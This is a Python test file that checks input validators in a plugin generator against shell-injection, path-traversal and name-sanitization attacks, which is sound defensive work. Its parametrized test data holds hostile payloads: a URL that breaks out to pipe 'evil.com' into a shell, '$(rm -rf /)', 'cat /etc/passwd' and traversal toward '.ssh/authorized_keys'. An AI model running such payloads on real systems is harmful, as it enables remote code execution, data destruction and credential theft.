"""Tests for pss_make_plugin.py — Phase 0 security release v3.5.1.

Covers the SEC-1..SEC-5 + COR-3 + PGA-L1 fixes from the
20260514 consolidated audit roadmap:

  SEC-1  shell injection across 6 fields in generate_data_dir_hook_script
  SEC-2  path traversal via npm/pip/rust_cargo/downloads[].dest
  SEC-3  validator coverage for data_dir / metadata / pass-through sections
  SEC-4  plugin / marketplace name sanitization at manifest boundary
  SEC-5  sanitized profile copy (no home-dir leak, plugin: source)
  COR-3  hook timeout unit fix (seconds, not milliseconds)
  PGA-L1 removeprefix("./") instead of lstrip("./")
"""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = ROOT / "scripts"


def _load_module(name: str):
    """Import a top-level script module from scripts/ without it on sys.path."""
    src = SCRIPTS / f"{name}.py"
    spec = importlib.util.spec_from_file_location(name, src)
    assert spec is not None and spec.loader is not None, f"cannot spec {src}"
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


make_plugin = _load_module("pss_make_plugin")
discover = _load_module("pss_discover")
validate = _load_module("pss_validate_agent_toml")


# ---------------------------------------------------------------------------
# SEC-1 — Shell injection at generator-time validation
#
# Each test ships a malicious .agent.toml field and asserts the generator
# refuses it with ValueError. Strict fail-fast — no silent absorption.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("malicious_url", [
    'https://example.com"; curl evil.com/x | sh; echo "',  # bash break-out
    'javascript:alert(1)',                                   # non-http scheme
    'file:///etc/passwd',                                    # local file scheme
    'data:text/plain,abc',                                   # data URI
    'http://',                                               # missing host
])
def test_sec1_download_url_rejected(malicious_url: str) -> None:
    """SEC-1: malicious download URL must be rejected at generate time."""
    with pytest.raises(ValueError):
        make_plugin._validate_https_url(malicious_url, "downloads[0].url")


@pytest.mark.parametrize("bad_sha", [
    'not-hex-at-all',
    '0' * 63,                                  # too short
    '0' * 65,                                  # too long
    'g' * 64,                                  # non-hex char
    '',                                        # empty
    None,                                      # non-string
])
def test_sec1_download_sha256_rejected(bad_sha) -> None:
    """SEC-1: non-64-hex sha256 must be rejected (incl. shell-metachar payloads)."""
    with pytest.raises(ValueError):
        make_plugin._validate_sha256(bad_sha, "downloads[0].sha256")


@pytest.mark.parametrize("field", ["data_dir.npm", "data_dir.pip", "data_dir.rust_cargo"])
@pytest.mark.parametrize("payload", [
    '/etc/passwd',                         # absolute path
    '../../etc/passwd',                    # traversal
    'a/../../b',                           # mid-path traversal
    '..',                                  # naked dotdot
    '',                                    # empty
    None,                                  # non-string
])
def test_sec1_npm_pip_cargo_path_payloads_rejected(field: str, payload) -> None:
    """SEC-2: path-traversal payloads in npm/pip/cargo are rejected.

    Note: shell-metachar filenames (";", "$()", "\\`") are NO LONGER threats
    after the v3.5.1 redesign because data-deps.json is consumed by Python
    with shell=False — they would be passed as literal filenames. They're
    valid POSIX path strings; rejecting them here would break legitimate
    filenames that happen to contain ';'. The threat surface is path
    traversal and absolute paths, which this test pins.
    """
    with pytest.raises(ValueError):
        make_plugin._safe_relpath(payload, field)


@pytest.mark.parametrize("field", ["data_dir.npm", "data_dir.pip", "data_dir.rust_cargo"])
@pytest.mark.parametrize("legitimate", [
    'package.json',
    'package;ok.json',           # ';' is a legal POSIX filename char
    'scope-foo/bar.json',
    'a$b.txt',                   # '$' is legal too
])
def test_sec1_npm_pip_cargo_legitimate_paths_accepted(field: str, legitimate: str) -> None:
    """Shell-metachar filenames survive _safe_relpath because shell=False
    runtime ensures they're never evaluated by a shell."""
    assert make_plugin._safe_relpath(legitimate, field) == legitimate


# ---------------------------------------------------------------------------
# SEC-2 — Path traversal blocked for downloads[].dest
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("dest", [
    '/etc/passwd',                            # absolute
    '../../.ssh/authorized_keys',             # traversal
    '../foo',                                 # single-level traversal
    'a/../../b',                              # mid-path traversal
    '',                                       # empty
])
def test_sec2_download_dest_traversal_rejected(dest) -> None:
    """SEC-2: absolute or '..' dest must be rejected."""
    with pytest.raises(ValueError):
        make_plugin._safe_relpath(dest, "downloads[0].dest")


def test_sec2_safe_relpath_accepts_clean_relative() -> None:
    """Sanity: clean relative paths survive validation."""
    assert make_plugin._safe_relpath("package.json", "x") == "package.json"
    assert make_plugin._safe_relpath("./package.json", "x") == "package.json"
    assert make_plugin._safe_relpath("a/b/c.txt", "x") == "a/b/c.txt"


# ---------------------------------------------------------------------------
# SEC-3 — Validator catches malformed sections that previously passed
# ---------------------------------------------------------------------------


def test_sec3_validator_rejects_javascript_url_in_metadata() -> None:
    """SEC-3: metadata.homepage = 'javascript:alert(1)' must error out."""
    result = validate.ValidationResult()
    validate.validate_metadata_section(
        {"metadata": {"homepage": "javascript:alert(1)"}}, result
    )
    assert not result.is_valid
    assert any("homepage" in e for e in result.errors)


def test_sec3_validator_rejects_traversal_dest_in_data_dir() -> None:
    """SEC-3: data_dir.downloads[*].dest with '..' must error out."""
    result = validate.ValidationResult()
    validate.validate_data_dir_section(
        {"data_dir": {
            "downloads": [{
                "url": "https://example.com/x",
                "sha256": "a" * 64,
                "dest": "../../etc/passwd",
            }],
        }}, result,
    )
    assert not result.is_valid
    assert any("dest" in e and "'..'" in e for e in result.errors)


def test_sec3_validator_rejects_non_hex_sha256() -> None:
    """SEC-3: non-hex sha256 in data_dir.downloads must error."""
    result = validate.ValidationResult()
    validate.validate_data_dir_section(
        {"data_dir": {
            "downloads": [{
                "url": "https://example.com/x",
                "sha256": "not-hex",
                "dest": "a.txt",
            }],
        }}, result,
    )
    assert not result.is_valid
    assert any("sha256" in e for e in result.errors)


def test_sec3_validator_rejects_deep_userconfig() -> None:
    """SEC-3: pathologically nested userConfig is rejected (OOM-bomb guard)."""
    deep = {"k": "v"}
    for _ in range(10):
        deep = {"k": deep}
    result = validate.ValidationResult()
    validate.validate_passthrough_section({"userConfig": deep}, "userConfig", result)
    assert not result.is_valid
    assert any("nesting depth" in e for e in result.errors)


def test_sec3_validator_accepts_clean_data_dir() -> None:
    """SEC-3 happy path: a well-formed data_dir survives validation."""
    result = validate.ValidationResult()
    validate.validate_data_dir_section(
        {"data_dir": {
            "npm": "package.json",
            "pip": "requirements.txt",
            "rust_cargo": "Cargo.toml",
            "downloads": [{
                "url": "https://example.com/x.bin",
                "sha256": "a" * 64,
                "dest": "bin/x",
            }],
        }}, result,
    )
    assert result.is_valid, f"unexpected errors: {result.errors}"


# ---------------------------------------------------------------------------
# SEC-4 — Plugin / marketplace name sanitization
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", [
    "../../etc/passwd",
    "a/b",                  # slashes
    "name with space",
    "name;cat /etc/passwd",
    "$(whoami)",
    ".hidden",              # leading dot
    "-flag",                # leading dash (looks like CLI flag)
    "",                     # empty
    "a" * 65,               # too long
    None,                   # non-string
])
def test_sec4_safe_name_rejects_payloads(payload) -> None:
    """SEC-4: dangerous manifest names must return None."""
    assert discover._safe_name(payload) is None


@pytest.mark.parametrize("name", [
    "my-plugin",
    "MyPlugin",       # PascalCase tolerated (legacy)
    "snake_case",     # snake_case tolerated
    "a.b.c",          # dotted tolerated
    "123abc",
])
def test_sec4_safe_name_accepts_clean(name: str) -> None:
    """SEC-4: legitimate names survive sanitization."""
    assert discover._safe_name(name) == name


def test_sec4_safe_plugin_id_requires_both_halves() -> None:
    """SEC-4: composite '<name>@<marketplace>' must validate both halves."""
    assert discover._safe_plugin_id("foo@bar") == "foo@bar"
    assert discover._safe_plugin_id("foo@..") is None
    assert discover._safe_plugin_id("../foo@bar") is None
    assert discover._safe_plugin_id("no-at-sign") is None
    assert discover._safe_plugin_id("") is None


# ---------------------------------------------------------------------------
# SEC-5 — Sanitize profile before embedding it in the generated plugin
# ---------------------------------------------------------------------------


def test_sec5_sanitize_strips_agent_path() -> None:
    profile = {"agent": {"name": "x", "path": "/Users/alice/.claude/agents/x.md"}}
    cleaned = make_plugin._sanitize_profile_for_copy(profile, "x")
    assert "path" not in cleaned["agent"]


def test_sec5_sanitize_rewrites_agent_source() -> None:
    profile = {"agent": {"name": "x", "path": "/abs/x.md", "source": "user"}}
    cleaned = make_plugin._sanitize_profile_for_copy(profile, "my-plugin")
    assert cleaned["agent"]["source"] == "plugin:my-plugin"


def test_sec5_sanitize_drops_absolute_paths_from_requirements_files() -> None:
    profile = {
        "agent": {"name": "x", "path": "/abs/x.md"},
        "requirements": {"files": ["/Users/alice/foo.md", "rel/path.md"]},
    }
    cleaned = make_plugin._sanitize_profile_for_copy(profile, "x")
    assert cleaned["requirements"]["files"] == ["rel/path.md"]


def test_sec5_sanitize_returns_new_dict_does_not_mutate() -> None:
    profile = {"agent": {"name": "x", "path": "/abs/x.md"}}
    cleaned = make_plugin._sanitize_profile_for_copy(profile, "x")
    # original profile must still have its [agent].path field
    assert profile["agent"]["path"] == "/abs/x.md"
    assert cleaned is not profile


# ---------------------------------------------------------------------------
# COR-3 — Hook timeouts emitted in SECONDS (not milliseconds)
# ---------------------------------------------------------------------------


def test_cor3_hook_timeouts_all_under_600_seconds(tmp_path: Path) -> None:
    """COR-3: every emitted hook timeout must be <= 600 seconds.

    Before this fix the generator emitted 5000/1500/60000 which CC reads as
    SECONDS, hanging SessionStart for 83 minutes.

    Verifies by running the generator on a minimal fixture and inspecting the
    output hooks.json.
    """
    # Minimal happy-path fixture; agent file must exist on disk.
    fake_agent = tmp_path / "fake.md"
    fake_agent.write_text("# fake\n")
    profile_path = tmp_path / "fake.agent.toml"
    profile_path.write_text(
        f'''[agent]
name = "fake"
path = "{fake_agent}"

[skills]
primary = ["pss-usage"]
secondary = []
specialized = []

[rules]
recommended = ["use-safe-delete"]

[data_dir]
npm = "package.json"
'''
    )
    output_dir = tmp_path / "out"
    proc = subprocess.run(
        ["uv", "run", "--script", str(SCRIPTS / "pss_make_plugin.py"),
         str(profile_path), "--output", str(output_dir), "--name", "fake"],
        capture_output=True, text=True, timeout=120,
    )
    # Generator may exit non-zero if cozo index is missing or skills aren't
    # in the index — we just need the hooks.json to have been written if the
    # script reached the hook-emit step.
    hooks_path = output_dir / "hooks" / "hooks.json"
    if not hooks_path.exists():
        pytest.skip(
            f"hooks.json not emitted (generator skipped past hook-emit step). "
            f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
        )
    hooks = json.loads(hooks_path.read_text())
    seen = 0
    for event_entries in hooks.get("hooks", {}).values():
        for entry in event_entries:
            for hook in entry.get("hooks", []):
                timeout = hook.get("timeout")
                assert isinstance(timeout, int), f"timeout must be int, got {timeout!r}"
                assert 0 < timeout <= 600, (
                    f"hook timeout {timeout} is out of plausible seconds range "
                    f"(would have been a ms-as-seconds bug)"
                )
                seen += 1
    assert seen > 0, "no hooks emitted — regression in fixture setup"


# ---------------------------------------------------------------------------
# Plugin name sanitization (SEC-4 / SEC-5 cross)
# ---------------------------------------------------------------------------


def test_sanitize_plugin_name_rejects_traversal_payloads() -> None:
    """Generator-side name sanitizer rejects path-traversal / shell payloads."""
    for bad in ["../../foo", "name with space", "$(rm -rf /)", "UPPER", ".hidden", ""]:
        with pytest.raises(ValueError):
            make_plugin._sanitize_plugin_name(bad)


def test_sanitize_plugin_name_accepts_kebab_case() -> None:
    assert make_plugin._sanitize_plugin_name("my-plugin") == "my-plugin"
    assert make_plugin._sanitize_plugin_name("a1") == "a1"
    assert make_plugin._sanitize_plugin_name("0plugin") == "0plugin"


# ---------------------------------------------------------------------------
# Static template existence (the file the generator copies is itself a
# Phase 0 deliverable — make sure it ships).
# ---------------------------------------------------------------------------


def test_install_template_ships_with_pss() -> None:
    """install_data_deps_template.py must be present and have a PEP 723 header."""
    template = SCRIPTS / "install_data_deps_template.py"
    assert template.exists(), "Phase 0 deliverable missing"
    content = template.read_text(encoding="utf-8")
    assert "# /// script" in content, "missing PEP 723 inline metadata"
    assert "shell=False" in content, "template MUST use subprocess shell=False"
    assert "subprocess.run" in content


# ---------------------------------------------------------------------------
# CC manifest alignment — displayName / defaultEnabled (v2.1.143 / v2.1.154)
# and the experimental.themes / experimental.monitors VALUE TYPES.
# The generator must emit a CC-correct plugin.json: displayName/defaultEnabled
# from [metadata]; themes as path string/array; monitors as typed array/path.
# A dict in [themes]/[monitors] is the pre-v3.10 mistake and must be dropped.
# ---------------------------------------------------------------------------


def _gen(profile: dict) -> dict:
    """Run generate_plugin_json with a minimal fixed identity + the profile."""
    return make_plugin.generate_plugin_json(
        "my-plugin", "my-agent", "A test agent.", profile, version="1.0.0"
    )


def test_manifest_display_name_emitted_from_metadata() -> None:
    """[metadata].display_name → plugin.json displayName (CC v2.1.143+)."""
    m = _gen({"metadata": {"display_name": "My Fancy Plugin"}})
    assert m["displayName"] == "My Fancy Plugin"


def test_manifest_display_name_absent_when_blank() -> None:
    """A blank/whitespace display_name is not emitted (falls back to name)."""
    m = _gen({"metadata": {"display_name": "   "}})
    assert "displayName" not in m


def test_manifest_default_enabled_false_is_honored() -> None:
    """default_enabled=false must emit defaultEnabled:false, not be dropped."""
    m = _gen({"metadata": {"default_enabled": False}})
    assert m["defaultEnabled"] is False


def test_manifest_default_enabled_true_emitted() -> None:
    """default_enabled=true → plugin.json defaultEnabled:true (CC v2.1.154+)."""
    m = _gen({"metadata": {"default_enabled": True}})
    assert m["defaultEnabled"] is True


def test_manifest_default_enabled_non_bool_ignored() -> None:
    """A non-bool default_enabled (e.g. the string 'yes') is ignored, not coerced."""
    m = _gen({"metadata": {"default_enabled": "yes"}})
    assert "defaultEnabled" not in m


def test_manifest_themes_path_string_passed_through() -> None:
    """experimental.themes accepts a path string (CC plugins-reference)."""
    m = _gen({"themes": "./themes"})
    assert m["experimental"]["themes"] == "./themes"


def test_manifest_themes_array_passed_through() -> None:
    """experimental.themes accepts an array of path strings."""
    m = _gen({"themes": ["./themes/a.json", "./themes/b.json"]})
    assert m["experimental"]["themes"] == ["./themes/a.json", "./themes/b.json"]


def test_manifest_themes_dict_is_dropped() -> None:
    """A dict [themes] is the invalid pre-v3.10 shape and must NOT be emitted."""
    m = _gen({"themes": {"base": "dark", "overrides": {}}})
    assert "experimental" not in m


def test_manifest_monitors_array_passed_through() -> None:
    """experimental.monitors accepts a typed array of monitor entries."""
    mons = [{"name": "watch", "command": "tail -f x", "description": "d"}]
    m = _gen({"monitors": mons})
    assert m["experimental"]["monitors"] == mons


def test_manifest_monitors_path_string_passed_through() -> None:
    """experimental.monitors accepts a relative path string."""
    m = _gen({"monitors": "./config/monitors.json"})
    assert m["experimental"]["monitors"] == "./config/monitors.json"


def test_manifest_monitors_dict_is_dropped() -> None:
    """A dict [monitors] is the invalid pre-v3.10 shape and must NOT be emitted."""
    m = _gen({"monitors": {"foo": "bar"}})
    assert "experimental" not in m
